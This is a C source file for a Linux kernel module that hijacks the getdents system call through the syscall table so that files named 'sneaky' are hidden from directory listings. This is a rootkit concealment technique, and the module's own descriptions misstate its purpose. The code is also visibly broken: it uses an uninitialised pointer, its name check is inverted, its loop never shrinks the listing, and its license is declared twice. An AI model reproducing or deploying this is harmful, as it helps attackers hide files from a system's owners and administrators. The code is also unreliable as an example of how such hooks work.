#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yann KOETH");
MODULE_DESCRIPTION("Loadable Kernel Module Syscall");
MODULE_VERSION("0.1");

#define SYS_CALL_TABLE "sys_call_table"
#define sys_getdents __NR_getdents
#define sneak_phrase "sneaky"
unsigned long* syscall_table;
struct linux_dirent{
  unsigned long d_ino;
  unsigned long d_off;
  unsigned short d_reclen;
  char d_name[];

};

typedef asmlinkage int (*originalGetDentsA) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
originalGetDentsA originalGetDents=NULL;

static asmlinkage long* hijackgetdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
    struct linux_dirent *hijackedDirent;
    char* fileNames;
    long original = originalGetDents(fd, dirp, count);

    if (original<= 0){
      return original;
    }

    char* hijackedBuffer= (char*)dirp;

    int counter=0;
    while(counter<original){
        hijackedDirent=(struct linux_dirent*)(fileNames+counter);
        if((strncmp(hijackedDirent->d_name,sneak_phrase, (sizeof(sneak_phrase)-1)))){
        memcpy(hijackedBuffer+counter, hijackedBuffer+counter+hijackedDirent->d_reclen, original-(counter+hijackedDirent->d_reclen));
    }
      else{
        counter = counter + hijackedDirent->d_reclen;
      }
    }

return original;

}

static int init_syscall(void)
{
        syscall_table = (unsigned long *)kallsyms_lookup_name(SYS_CALL_TABLE);
        originalGetDents =syscall_table[sys_getdents];
        syscall_table[sys_getdents]=(unsigned long*) hijackgetdents;
        printk(KERN_INFO "Custom syscall loaded\n");
        return 0;
}

static void cleanup_syscall(void)
{
        syscall_table[sys_getdents]=(*originalGetDents);
        printk(KERN_INFO "Syscall at offset %d : %p\n", sys_getdents, (void *)syscall_table[sys_getdents]);
        printk(KERN_INFO "Custom syscall unloaded\n");
        return 0;
}

module_init(init_syscall);
module_exit(cleanup_syscall);


MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("A kernel module to list process by their names");
